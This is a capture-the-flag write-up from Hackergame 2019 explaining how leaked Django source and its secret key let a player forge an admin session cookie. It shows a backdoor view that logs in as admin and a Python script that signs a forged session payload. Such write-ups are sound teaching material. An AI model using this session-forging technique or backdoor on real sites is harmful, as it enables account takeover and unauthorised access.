hackergame2019-被泄露的姜戈(CallMeCro)
----
「听说有离职的同学，把你们的代码和数据库泄漏了出去？好像还在什么 hub 还是 lab 来着建了一个叫 openlug……」

「没关系，反正 admin 用户的密码长度有 1024 位，我自己都忘了密码，就算老天爷来了，也看不到我们的 flag！」

Examination Site
----
* django session
* python code analysis

Analysis
----
Opening the web page will display a form that requires us to input an account and password.A hint is below the form
```bash
你可以使用 guest 用户（密码为 guest）体验。
```
When you login as the guest,the web page will display your cookie and remind you that you can get the flag only by logging in as the admin.
```bash
Debug - Your cookie
sessionid=.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iMsPb:Nx7ePDqCPji95TS21SJGVh3TBbk
```
So we can see that we have to login as the admin to get the flag.
With the question description,we will find the source code:
https://github.com/openlug/django-common
https://gitlab.com/openlug/django-common

```bash
from django.core.management.base import BaseCommand
from django.contrib.auth.models import User
import os


class Command(BaseCommand):
    help = 'Create admin & guest user'

    def handle(self, *args, **options):
        def create_user(name, password=None):
            user = User.objects.create_user(name,
                                            password=os.urandom(1024) if password is None else password)
            user.is_superuser = False
            user.is_staff = False
            user.save()

        create_user("admin")
        create_user("guest", "guest")
```
After analyzing,we will see that it's unrealistic to login as the admin by cracking the password,only by foring the session.Let's exploit it!

Expolit One
----
Since you have source code,you can make a backdoor to be admin login to enter the profile.But it need some knowledge about django.

Add it in the app/views.py:
```bash
def backdoor(request):
    user = User.objects.get(username="admin")  # use Django ORM to choice admin 
    login(request, user) # login as admin
    return redirect(reverse("profile")) # jump to profile
```

Add it in the app/urls.py:
```bash
path('backdoor', views.backdoor, name='backdoor')
```
Run it,then we access the backdoor to get admin cookie which can be used to log in the server to get flag{Never_leak_your_sEcReT_KEY}.

Exploit Two
----
Analyzing the session code and forging it, this was my frist idea.However,I didn't understand the source code because I didn't understand function "signing.loads" and I gave up here **(SUCCESS IS CLOSE AT HAND, AND IT IS A SHORTFALL)**.

As we have the guest cookie
```bash
.eJxVjDEOgzAMRe_iGUUQULE7du8ZIid2GtoqkQhMVe8OSAzt-t97_wOO1yW5tersJoErWGh-N8_hpfkA8uT8KCaUvMyTN4diTlrNvYi-b6f7d5C4pr1uGXGI6AnHGLhjsuESqRdqByvYq_JohVDguwH3fzGM:1iMsxr:yKCyLqXVih52879xB-FmomMjwsg
```
we can use "signing.loads" to restore it.
```bash
{'_auth_user_hash': '0a884f8b987fca1a92c6f93d9042d83eea72d98d', '_auth_user_id': '2', '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend'}
```
It is easy to guess that admin auth_user_id is 1.Now we need to know the auth_user_hash.
It is generated by get_session_auth_hash() in django/contrib/auth/base_user.py.
```bash
def get_session_auth_hash(self):
    """
    Return an HMAC of the password field.
    """
    key_salt = "django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash"
    return salted_hmac(key_salt, self.password).hexdigest()
```

Finally,the exp is this.
```bash
from django.core import signing
from django.utils.crypto import salted_hmac

admin_hash = "pbkdf2_sha256$150000$KkiPe6beZ4MS$UWamIORhxnonmT4yAVnoUxScVzrqDTiE9YrrKFmX3hE="

_auth_user_hash = salted_hmac("django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash",
                              admin_hash).hexdigest()

payload = {'_auth_user_id': '1',
           '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
           '_auth_user_hash': _auth_user_hash}

cookie = signing.dumps(payload,
                       salt='django.contrib.sessions.backends.signed_cookies',
                       compress=True)

print(cookie)
```
Add this in the backdoor and access localhost/backdoor to get it.



